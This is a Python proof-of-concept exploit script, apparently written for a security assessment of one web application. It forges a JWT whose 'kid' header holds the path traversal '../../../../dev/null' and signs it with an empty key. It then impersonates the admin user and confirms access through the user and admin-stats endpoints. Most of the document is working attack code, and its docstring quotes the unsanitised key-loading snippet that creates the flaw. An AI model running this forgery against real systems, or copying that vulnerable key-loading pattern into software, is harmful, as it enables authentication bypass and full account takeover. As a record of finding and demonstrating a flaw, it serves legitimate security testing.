#!/usr/bin/env python3
"""
AUTHN-1 — JWT `kid` Header Path Traversal → Privilege Escalation to Admin
Endpoint: Any authenticated endpoint
Auth    : None — no valid credentials required

The backend adds `kid` (key ID) support to JWT signing. On verification,
it extracts `kid` from the token header without sanitization and reads the
signing key from disk:

    key_path = os.path.join(KEYS_DIR, kid)   # KEYS_DIR = /app/keys/
    signing_key = open(key_path).read().strip()
    jwt.decode(token, signing_key, algorithms=["HS256"])

No path sanitization is applied — `os.path.realpath()` is never called.

Attack
------
Target: read a file that contains a known or empty string.
        The most reliable target in Linux/Docker: /dev/null  → empty string ""

Craft:
  1. Set  kid = "../../../../dev/null"
       → key_path resolves to /dev/null
       → signing_key = ""   (empty file)

  2. Sign a JWT with HMAC-SHA256 using key="" and arbitrary claims:
       {"sub": "1", "type": "access", "exp": <far future>}
       (sub=1 is the admin user in the seeded database)

  3. Send the forged token as Bearer to any protected endpoint.
     Server reads /dev/null, gets "", verifies with "" → MATCH → authenticated
     as admin.

Result: unauthenticated attacker becomes admin with no credentials.

Requirements
------------
    pip install python-jose requests

Note: /dev/null only exists on Linux/macOS (Docker container).
      On Windows local dev, substitute a known-empty file path.

Usage
-----
    python poc_020_jwt_kid_path_traversal.py
    python poc_020_jwt_kid_path_traversal.py --url http://localhost:8000
    python poc_020_jwt_kid_path_traversal.py --sub 2 --kid "../../../../dev/null"
"""

import argparse
import sys
from datetime import datetime, timedelta

import requests
from jose import jwt

KID_PAYLOAD    = "../../../../dev/null"
EMPTY_KEY      = ""
ADMIN_USER_ID  = 1


def banner():
    print("=" * 60)
    print("  AUTHN-1 — JWT kid Path Traversal → Admin Takeover")
    print("  No credentials required")
    print("=" * 60)


def forge_token(sub: int, kid: str, key: str = "") -> str:
    expire = datetime.utcnow() + timedelta(days=365)
    payload = {
        "sub": str(sub),
        "type": "access",
        "exp": expire,
    }
    token = jwt.encode(payload, key, algorithm="HS256", headers={"kid": kid})
    return token


def verify_admin(base_url: str, token: str) -> dict | None:
    resp = requests.get(
        f"{base_url}/api/admin/stats",
        headers={"Authorization": f"Bearer {token}"},
        timeout=10,
    )
    if resp.status_code == 200:
        return resp.json()
    return None


def whoami(base_url: str, token: str) -> dict | None:
    resp = requests.get(
        f"{base_url}/api/users/me",
        headers={"Authorization": f"Bearer {token}"},
        timeout=10,
    )
    if resp.status_code == 200:
        return resp.json()
    return None


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", default="http://localhost:8000")
    parser.add_argument("--sub", type=int, default=ADMIN_USER_ID,
                        help="User ID to impersonate (default: 1 = admin)")
    parser.add_argument("--kid", default=KID_PAYLOAD,
                        help="kid path traversal payload")
    args = parser.parse_args()

    banner()
    print(f"[*] Target : {args.url}")
    print(f"[*] kid    : {args.kid}")
    print(f"[*] sub    : {args.sub}  (user to impersonate)")
    print(f"[*] key    : {repr(EMPTY_KEY)}  (content of traversal target)")
    print()

    # Step 1 — forge token
    token = forge_token(args.sub, args.kid, EMPTY_KEY)
    print(f"[+] Forged JWT:")
    print(f"    {token}")
    print()

    # Step 2 — who am I?
    me = whoami(args.url, token)
    if me:
        print(f"[+] /api/users/me  →  id={me.get('id')}  email={me.get('email')!r}  role={me.get('role')!r}")
    else:
        print("[-] /api/users/me rejected the token — server may not be running or kid path differs")
        print("    Hint: adjust --kid for the actual filesystem layout inside the container")
        sys.exit(1)

    # Step 3 — hit admin endpoint
    stats = verify_admin(args.url, token)
    if stats:
        print(f"[+] /api/admin/stats →  {stats}")
        print()
        print("[+] SUCCESS — forged token accepted as admin")
    else:
        print("[-] Admin endpoint rejected — user may not be admin (try --sub 1)")

    print("\n[+] Done.")


if __name__ == "__main__":
    main()
